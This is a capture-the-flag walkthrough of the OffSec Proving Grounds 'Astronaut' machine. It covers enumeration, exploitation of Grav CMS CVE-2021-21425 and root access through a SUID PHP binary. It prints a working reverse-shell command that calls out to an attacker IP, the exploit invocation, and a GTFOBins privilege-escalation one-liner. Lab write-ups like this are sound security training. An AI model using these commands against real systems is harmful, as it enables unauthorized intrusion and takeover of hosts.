# Astronaut — OffSec Proving Grounds Walkthrough

**Platform:** Proving Grounds Practice
**Difficulty:** Intermediate
**OS:** Linux

---

## TL;DR

Grav CMS with unauthenticated YAML write vulnerability (CVE-2021-21425) → reverse shell as `www-data` → SUID PHP 7.4 binary → root via `pcntl_exec`.

---

## Enumeration

Starting with a full port scan:

```bash
nmap -sV -p- 192.168.174.12
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.2p1 Ubuntu |
| 80 | HTTP | Apache httpd 2.4.41 |

Just SSH and a web server. Let's dig into port 80.

Running gobuster against the site, we find a `/grav-admin/` directory:

```bash
gobuster dir -u http://192.168.171.12/grav-admin/ -w `/usr/share/wordlists/dirb/common.txt`
```

Interesting finds:
- `/admin` — Admin login panel (200)
- `/login` — Login page (200)
- `/backup` — Backup directory (301)
- `/user` — User directory (301)

So we're dealing with **Grav CMS**. We couldn't pin down the exact version from the site itself, but that doesn't matter much when you've got an unauthenticated exploit.

---

## Exploitation — CVE-2021-21425 (Grav CMS Unauthenticated RCE)

After some searching, we find a solid exploit for **CVE-2021-21425** — an unauthenticated arbitrary YAML write vulnerability that leads to code execution.

- **Exploit:** [https://github.com/CsEnox/CVE-2021-21425](https://github.com/CsEnox/CVE-2021-21425)
- **Write-up:** [Unexpected Journey #7 — GravCMS Unauthenticated RCE](https://pentest.blog/unexpected-journey-7-gravcms-unauthenticated-arbitrary-yaml-write-update-leads-to-code-execution/)

Download the exploit and fire it off:

```bash
python3 exp.py -t http://192.168.171.12/grav-admin -c 'sh -i >& /dev/tcp/192.168.45.233/6969 0>&1'
```

Set up our listener:

```bash
nc -lvnp 6969
```

We get a shell as `www-data`. Nice.

---

## Privilege Escalation — SUID PHP Binary

Time to hunt for escalation vectors. Let's search for SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Scrolling through the output, one entry jumps out:

```
/usr/bin/php7.4
```

PHP with the SUID bit set? That's basically a gift. Heading over to [GTFOBins](https://gtfobins.github.io/gtfobins/php/), we find the SUID exploit for PHP:

```bash
php -r "pcntl_exec('/bin/sh', ['-p']);"
```

The `-p` flag preserves the effective UID (which is root thanks to the SUID bit).

And just like that — **root**. 🎉

---

## Key Takeaways

- **Grav CMS CVE-2021-21425** doesn't even need authentication — unauthenticated YAML write → RCE. Always check for this on Grav instances
- **SUID binaries** are one of the first things to check for privilege escalation — `find / -perm -u=s -type f 2>/dev/null` should be in your muscle memory
- **GTFOBins** is your go-to reference for exploiting misconfigured SUID binaries — bookmark it if you haven't already

---

*Thanks for reading! Follow for more OffSec walkthrough content.*
